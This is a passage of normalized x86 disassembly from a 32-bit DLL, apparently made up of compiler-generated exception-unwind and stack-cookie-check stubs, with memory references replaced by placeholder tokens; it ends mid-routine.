mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002752d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027548
lea esi [ ebp - 0x30 ]
jmp sub_1000175c
sub_10027550
lea esi [ ebp - 0x4c ]
jmp sub_1000175c
sub_10027558
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002757d
mov eax [ ebp + 0x8 ]
jmp sub_100018c3
sub_10027585
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100275a0
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov edi [ ebp - 0x30 ]
jmp sub_100014cd
sub_100275b9
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100275c1
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100275c9
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100275d1
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100275d9
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100275e1
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100275e9
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100275f1
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100275f9
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_10027601
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_10027609
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_10027611
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_10027619
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_10027621
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_10027629
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_10027631
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002764c
mov ecx [ ebp - 0x10 ]
jmp sub_1000a4cf
sub_10027654
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_1002765c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027677
lea ecx [ ebp - 0x38 ]
jmp sub_10001704
sub_1002767f
push [ ebp - 0x10 ]
call sub_10010ba2
pop ecx
retn
sub_10027689
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov eax [ ebp + 0x8 ]
jmp sub_1000305f
sub_100276a2
lea ecx [ ebp - 0x54 ]
jmp sub_10001704
sub_100276aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100276c5
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_100276cd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100276e8
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_100276f0
lea ecx [ ebp - 0x48 ]
jmp sub_10001704
sub_100276f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027713
lea ecx [ ebp - 0x28 ]
jmp sub_10001704
sub_1002771b
lea ecx [ ebp - 0x44 ]
jmp sub_10001704
sub_10027723
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002773e
lea ecx [ ebp - 0x28 ]
jmp sub_10001704
sub_10027746
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027761
lea ecx [ ebp - 0x3c ]
jmp sub_10001704
sub_10027769
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027784
lea eax [ ebp - 0x20 ]
jmp sub_1000305f
sub_1002778c
lea eax [ ebp - 0x18 ]
jmp sub_1000305f
sub_10027794
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov esi [ ebp + 0xc ]
jmp sub_1000175c
sub_100277ad
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100277c8
lea eax [ ebp + 0x10 ]
jmp sub_1000305f
sub_100277d0
lea ecx [ ebp - 0x28 ]
jmp sub_10001704
sub_100277d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100277f3
lea ecx [ ebp - 0x40 ]
jmp sub_10001704
sub_100277fb
push [ ebp - 0x24 ]
call sub_10010ba2
pop ecx
retn
sub_10027805
lea eax [ ebp - 0x18 ]
jmp sub_1000305f
sub_1002780d
lea ecx [ ebp - 0x40 ]
jmp sub_10001704
sub_10027815
lea edi [ ebp - 0x94 ]
jmp sub_1000bae7
sub_10027820
mov eax [ ebp - 0x20 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x20 ] 0xfffffffe
mov edi [ ebp + 0xc ]
jmp sub_1000bae7
sub_10027839
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027857
lea ecx [ ebp - 0x80 ]
jmp sub_10001704
sub_1002785f
lea ecx [ ebp - 0x9c ]
jmp sub_10001704
sub_1002786a
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xa4 ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002788b
lea ecx [ ebp - 0x244 ]
jmp sub_10001704
sub_10027896
lea ecx [ ebp - 0x260 ]
jmp sub_10001704
sub_100278a1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28c ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100278c9
lea ecx [ ebp - 0x90 ]
jmp sub_10001704
sub_100278d4
lea esi [ ebp - 0x30 ]
jmp sub_1000175c
sub_100278dc
lea ecx [ ebp - 0x90 ]
jmp sub_10001704
sub_100278e7
lea ecx [ ebp - 0x74 ]
jmp sub_10001704
sub_100278ef
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x9c ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_10010789
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002791d
lea ecx [ ebp - 0x44 ]
jmp sub_10001704
sub_10027925
lea ecx [ ebp - 0x28 ]
jmp sub_10001704
sub_1002792d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027948
lea ecx [ ebp - 0x28 ]
jmp sub_10001704
sub_10027950
lea ecx [ ebp - 0x44 ]
jmp sub_10001704
sub_10027958
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027973
lea ecx [ ebp - 0x23c ]
jmp sub_10001704
sub_1002797e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x240 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100279a6
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_100279ae
lea ecx [ ebp - 0x4c ]
jmp sub_10001704
sub_100279b6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100279d1
lea ecx [ ebp - 0x28 ]
jmp sub_10001704
sub_100279d9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100279f4
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_100279fc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027a17
lea ecx [ ebp - 0x70 ]
jmp sub_10001704
sub_10027a1f
lea ecx [ ebp - 0x54 ]
jmp sub_10001704
sub_10027a27
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027a42
lea ecx [ ebp - 0x5c ]
jmp sub_10001704
sub_10027a4a
lea ecx [ ebp - 0x5c ]
jmp sub_10001704
sub_10027a52
lea ecx [ ebp - 0x5c ]
jmp sub_10001704
sub_10027a5a
lea ecx [ ebp - 0x5c ]
jmp sub_10001704
sub_10027a62
lea ecx [ ebp - 0x18 ]
jmp sub_1000a4cf
sub_10027a6a
lea ecx [ ebp - 0x40 ]
jmp sub_10001704
sub_10027a72
lea ecx [ ebp - 0x24 ]
jmp sub_10008739
sub_10027a7a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x88 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027a98
mov ecx [ ebp - 0x10 ]
jmp sub_10008739
sub_10027aa0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027abb
lea ecx [ ebp - 0x80 ]
jmp sub_10001704
sub_10027ac3
lea ecx [ ebp - 0x64 ]
jmp sub_10001704
sub_10027acb
lea eax [ ebp - 0x88 ]
jmp sub_1000305f
sub_10027ad6
lea ecx [ ebp - 0x48 ]
jmp sub_10001704
sub_10027ade
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10027ae6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027b0e
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_1000184a
sub_10027b19
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
jmp sub_10001704
sub_10027b24
mov ecx [ ebp + 0x8 ]
add ecx 0x38
jmp sub_10001704
sub_10027b2f
mov esi [ ebp + 0x8 ]
add esi 0x54
jmp sub_1000175c
sub_10027b3a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027b55
lea ecx [ ebp + 0x8 ]
jmp sub_100086e3
sub_10027b5d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027b78
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10008693
sub_10027b94
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10008130
sub_10027b9f
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10003ff9
sub_10027baa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027bc5
lea esi [ ebp - 0x2c ]
jmp sub_1000175c
sub_10027bcd
lea esi [ ebp - 0x48 ]
jmp sub_1000175c
sub_10027bd5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027bf0
lea eax [ ebp + 0x8 ]
jmp sub_1000305f
sub_10027bf8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027c13
mov eax [ ebp - 0xe4 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xe4 ] 0xfffffffe
lea ecx [ ebp - 0x1c ]
jmp sub_10008b6c
sub_10027c32
lea eax [ ebp - 0xe0 ]
jmp sub_10003212
sub_10027c3d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xe4 ]
mov ecx [ edx - 0xe8 ]
xor ecx eax
call sub_10010789
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027c6b
lea ecx [ ebp - 0x24c ]
jmp sub_10008739
sub_10027c76
lea esi [ ebp - 0x26c ]
jmp sub_1000175c
sub_10027c81
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x270 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027ca9
mov ecx [ ebp + 0x8 ]
jmp sub_10008739
sub_10027cb1
mov edi [ ebp + 0x8 ]
add edi 0x18
jmp sub_100014cd
sub_10027cbc
mov eax [ ebp + 0x8 ]
add eax 0xd4
jmp sub_1000184a
sub_10027cc9
mov esi [ ebp + 0x8 ]
add esi 0xec
jmp sub_1000175c
sub_10027cd7
mov esi [ ebp + 0x8 ]
add esi 0x108
jmp sub_1000175c
sub_10027ce5
lea esi [ ebp - 0x28 ]
jmp sub_1000175c
sub_10027ced
mov ecx [ ebp + 0x8 ]
add ecx 0x124
jmp sub_10008760
sub_10027cfb
lea esi [ ebp - 0x44 ]
jmp sub_1000175c
sub_10027d03
mov ecx [ ebp + 0x8 ]
add ecx 0x148
jmp sub_10008760
sub_10027d11
mov eax [ ebp - 0x48 ]
jmp sub_100018c3
sub_10027d19
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027d34
push [ ebp - 0x14 ]
call sub_10010ba2
pop ecx
retn
sub_10027d3e
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea edi [ ebp - 0xd0 ]
jmp sub_100014cd
sub_10027d5a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027d78
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10027d80
lea ecx [ ebp - 0x48 ]
jmp sub_10001704
sub_10027d88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027da3
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_10027dab
lea ecx [ ebp - 0x48 ]
call sub_10001704
retn
sub_10027db4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027dcf
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov eax [ ebp + 0x8 ]
jmp sub_1000305f
sub_10027de8
lea eax [ ebp - 0x1c ]
jmp sub_1000305f
sub_10027df0
lea eax [ ebp - 0x1c ]
jmp sub_1000305f
sub_10027df8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027e13
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_1000175c
sub_10027e1e
mov eax [ ebp + 0x8 ]
add eax 0x3c
jmp sub_1000305f
sub_10027e29
lea eax [ ebp - 0x18 ]
jmp sub_1000305f
sub_10027e31
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027e4c
push [ ebp - 0x10 ]
call sub_10010ba2
pop ecx
retn
sub_10027e56
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027e71
mov eax [ ebp - 0x30 ]
jmp sub_1000305f
sub_10027e79
lea esi [ ebp - 0x2c ]
jmp sub_1000175c
sub_10027e81
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027e9c
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10008693
sub_10027eb8
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_10009f16
sub_10027ec3
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_1000971d
sub_10027ece
mov ecx [ ebp - 0x14 ]
jmp sub_100080d1
sub_10027ed6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027ef1
lea ecx [ ebp - 0x54 ]
jmp sub_10001704
sub_10027ef9
push [ ebp - 0x58 ]
call sub_10010ba2
pop ecx
retn
sub_10027f03
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027f1e
mov eax [ ebp + 0x8 ]
jmp sub_100083c0
sub_10027f26
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027f41
lea eax [ ebp - 0x28 ]
push eax
call sub_100075d2
retn
sub_10027f4b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027f66
lea ecx [ ebp + 0xc ]
jmp sub_100086e3
sub_10027f6e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027f89
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10008693
sub_10027fa5
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_10008373
sub_10027fb0
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_100039e2
sub_10027fbb
mov ecx [ ebp - 0x14 ]
jmp sub_100082de
sub_10027fc3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10027fde
lea esi [ ebp - 0x58 ]
jmp sub_1000175c
sub_10027fe6
lea esi [ ebp - 0x30 ]
jmp sub_1000175c
sub_10027fee
lea esi [ ebp - 0x74 ]
jmp sub_1000175c
sub_10027ff6
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov esi [ ebp - 0x3c ]
jmp sub_1000175c
sub_1002800f
lea eax [ ebp - 0xfc ]
jmp sub_1000314f
sub_1002801a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x100 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028042
lea ecx [ ebp - 0x18 ]
jmp sub_1000a4cf
sub_1002804a
lea esi [ ebp - 0x3c ]
jmp sub_1000175c
sub_10028052
lea eax [ ebp - 0x20 ]
jmp sub_1000305f
sub_1002805a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028075
lea eax [ ebp - 0x1c ]
push eax
call sub_100075d2
retn
sub_1002807f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002809a
lea ecx [ ebp - 0xc0 ]
jmp sub_10001704
sub_100280a5
lea esi [ ebp - 0x68 ]
jmp sub_1000175c
sub_100280ad
lea esi [ ebp - 0x4c ]
jmp sub_1000175c
sub_100280b5
lea esi [ ebp - 0xa4 ]
jmp sub_1000175c
sub_100280c0
lea esi [ ebp - 0xdc ]
jmp sub_1000175c
sub_100280cb
lea ecx [ ebp - 0x7c ]
jmp sub_1000c590
sub_100280d3
lea esi [ ebp - 0xc0 ]
jmp sub_1000175c
sub_100280de
lea esi [ ebp - 0x114 ]
jmp sub_1000175c
sub_100280e9
lea esi [ ebp - 0x130 ]
jmp sub_1000175c
sub_100280f4
lea esi [ ebp - 0xf8 ]
jmp sub_1000175c
sub_100280ff
lea esi [ ebp - 0x14c ]
jmp sub_1000175c
sub_1002810a
lea ecx [ ebp - 0x74 ]
jmp sub_1000c63e
sub_10028112
lea eax [ ebp - 0x1e4 ]
jmp sub_10009109
sub_1002811d
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_10028125
lea ecx [ ebp - 0xa4 ]
jmp sub_10001704
sub_10028130
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1e8 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028158
lea eax [ ebp - 0x58 ]
jmp sub_1000305f
sub_10028160
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_10028168
lea ecx [ ebp - 0x4c ]
jmp sub_10001704
sub_10028170
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10010789
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028198
lea eax [ ebp - 0x34 ]
jmp sub_1000305f
sub_100281a0
lea ecx [ ebp - 0x2c ]
jmp sub_10001704
sub_100281a8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100281c3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100281de
lea ecx [ ebp - 0x14 ]
jmp sub_1000a0aa
sub_100281e6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028201
lea eax [ ebp - 0x28 ]
jmp sub_1000184a
sub_10028209
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028224
lea eax [ ebp - 0x2c ]
push eax
call sub_100075d2
retn
sub_1002822e
lea ecx [ ebp - 0x20 ]
jmp sub_100086e3
sub_10028236
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028251
lea eax [ ebp - 0x24 ]
push eax
call sub_100075d2
retn
sub_1002825b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028276
lea eax [ ebp - 0x20 ]
push eax
call sub_100075d2
retn
sub_10028280
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_1002829b
lea eax [ ebp - 0x20 ]
push eax
call sub_100075d2
retn
sub_100282a5
lea ecx [ ebp - 0x18 ]
jmp sub_100086e3
sub_100282ad
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100282c8
lea eax [ ebp - 0x20 ]
push eax
call sub_100075d2
retn
sub_100282d2
lea ecx [ ebp - 0x18 ]
jmp sub_100086e3
sub_100282da
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100282f5
lea eax [ ebp - 0x28 ]
push eax
call sub_100075d2
retn
sub_100282ff
lea ecx [ ebp - 0x1c ]
jmp sub_100086e3
sub_10028307
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028322
lea esi [ ebp - 0xe0 ]
jmp sub_1000175c
sub_1002832d
lea esi [ ebp - 0xc4 ]
jmp sub_1000175c
sub_10028338
lea ecx [ ebp - 0xa4 ]
jmp sub_1000b788
sub_10028343
lea esi [ ebp - 0x40 ]
jmp sub_1000175c
sub_1002834b
lea edi [ ebp - 0x68 ]
jmp sub_1000bae7
sub_10028353
mov eax [ ebp - 0x98 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x98 ] 0xfffffffe
mov esi [ ebp - 0x94 ]
jmp sub_1000175c
sub_10028375
lea eax [ ebp - 0x168 ]
jmp sub_10002d01
sub_10028380
lea esi [ ebp - 0x40 ]
jmp sub_1000175c
sub_10028388
lea esi [ ebp - 0x5c ]
jmp sub_1000175c
sub_10028390
lea edi [ ebp - 0x90 ]
jmp sub_1000bae7
sub_1002839b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x16c ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100283c3
lea esi [ ebp + 0x28 ]
jmp sub_1000175c
sub_100283cb
lea esi [ ebp + 0x44 ]
jmp sub_1000175c
sub_100283d3
lea esi [ ebp - 0x74 ]
jmp sub_1000175c
sub_100283db
lea esi [ ebp - 0x58 ]
jmp sub_1000175c
sub_100283e3
lea esi [ ebp + 0x60 ]
jmp sub_1000175c
sub_100283eb
lea esi [ ebp + 0x7c ]
jmp sub_1000175c
sub_100283f3
lea eax [ ebp - 0x118 ]
jmp sub_10002d01
sub_100283fe
lea esi [ ebp - 0x90 ]
jmp sub_1000175c
sub_10028409
lea edi [ ebp ]
jmp sub_1000bae7
sub_10028411
lea esi [ ebp - 0x3c ]
jmp sub_1000175c
sub_10028419
lea esi [ ebp + 0x7c ]
jmp sub_1000175c
sub_10028421
lea ecx [ ebp - 0x20 ]
jmp sub_1000b788
sub_10028429
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x11c ]
xor ecx eax
call sub_10010789
mov ecx [ edx + 0xa4 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028454
lea esi [ ebp - 0x30 ]
jmp sub_1000175c
sub_1002845c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028481
lea esi [ ebp - 0x50 ]
jmp sub_1000175c
sub_10028489
lea esi [ ebp - 0x90 ]
jmp sub_1000175c
sub_10028494
lea esi [ ebp - 0x34 ]
jmp sub_1000175c
sub_1002849c
lea ecx [ ebp - 0x5c ]
